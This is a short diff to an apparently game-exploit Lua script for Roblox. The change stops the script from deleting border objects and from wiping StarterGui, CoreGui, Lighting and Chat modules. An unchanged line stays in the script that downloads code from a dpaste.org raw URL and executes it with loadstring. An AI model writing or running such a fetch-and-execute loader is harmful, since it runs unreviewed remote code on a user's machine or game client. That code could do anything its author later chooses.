@@ -173,22 +173,9 @@ task.spawn(function()
     end
 
     for _, v in pairs(game:GetService("Workspace"):GetChildren()) do
-        if v.Name == "Camera" or v.Name == "Border" or v.Name == "Border2" or v.Name == "FlyBorder" or v.Name == "FlyBorder2" then
+        if v.Name == "Camera" then
             v:Destroy()
         end
-    end
-
-    for _, v in pairs(game:GetService("StarterGui"):GetChildren()) do
-        v:Destroy()
-    end
-
-    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        v:Destroy()
-    end
-    
-    game:GetService("Lighting"):ClearAllChildren()
-    for _, v in pairs(game:GetService("Chat").ClientChatModules:GetChildren()) do
-        v:Destroy()
     end
 
     loadstring(game:HttpGet("https://dpaste.org/Nr0nB/raw"))()
